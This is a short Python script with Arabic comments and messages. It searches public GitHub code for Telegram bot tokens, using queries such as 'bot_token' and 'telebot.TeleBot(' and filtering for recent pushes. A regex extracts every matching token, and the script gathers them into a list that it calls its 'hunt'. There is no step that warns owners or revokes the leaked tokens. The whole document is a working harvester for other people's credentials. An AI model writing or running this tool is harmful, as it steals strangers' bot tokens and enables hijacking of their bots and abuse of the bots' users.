import re
import os
import datetime
from github import Github, GithubException

def search_for_tokens():
    token = os.getenv('GITHUB_TOKEN')
    if not token:
        print("[!] GITHUB_TOKEN غير موجود!")
        return []
        
    print("[*] بدء عملية الصيد الاحترافية...")
    try:
        g = Github(token, timeout=15)
    except Exception as e:
        print(f"[!] خطأ الاتصال: {e}")
        return []

    found_tokens = []
    
    # 1. الاستراتيجية الأولى: المسح الشامل (البحث عن هيكلية البوتات)
    broad_queries = [
        'filename:main.py "bot_token"',
        'filename:config.py "TOKEN"',
        '"bot.polling()"',
        '"telebot.TeleBot("',
        'telegram token'
    ]
    
    # 2. الاستراتيجية الثانية: المسح العميق (آخر 5 أيام)
    five_days_ago = (datetime.datetime.utcnow() - datetime.timedelta(days=5)).strftime('%Y-%m-%d')
    deep_queries = [
        f'bot_token pushed:>{five_days_ago}',
        f'telebot pushed:>{five_days_ago}',
        f'telegram_token pushed:>{five_days_ago}'
    ]
    
    # دمج الاستراتيجيتين
    all_queries = broad_queries + deep_queries
    
    for query in all_queries:
        print(f"[>] جاري فحص: {query}")
        try:
            results = g.search_code(query=query, sort='indexed', order='desc')
            
            count = 0
            # استخدام iterator آمن للنتائج
            for file in results:
                if count >= 15: break # 15 نتيجة لكل استعلام لضمان سرعة الدوران
                try:
                    content = file.decoded_content.decode('utf-8')
                    # ريجكس محسن لاستخراج التوكنات
                    matches = re.findall(r'[0-9]{8,15}:[a-zA-Z0-9_-]{35}', content)
                    for token in matches:
                        if token not in found_tokens:
                            found_tokens.append(token)
                            count += 1
                except: continue
            
            print(f"[+] تم استخراج {count} توكن من: {query}")
            
        except GithubException as e:
            if e.status == 403:
                print("[!] معدل الطلبات ممتلئ، انتظار دقيقة...")
                break # الخروج من الدوران لتجنب الحظر
            print(f"[!] خطأ في الاستعلام: {e}")
        except Exception as e:
            print(f"[!] خطأ غير متوقع: {e}")
            
    print(f"[*] تمت عملية المسح. إجمالي الصيد الحالي: {len(found_tokens)}")
    return found_tokens
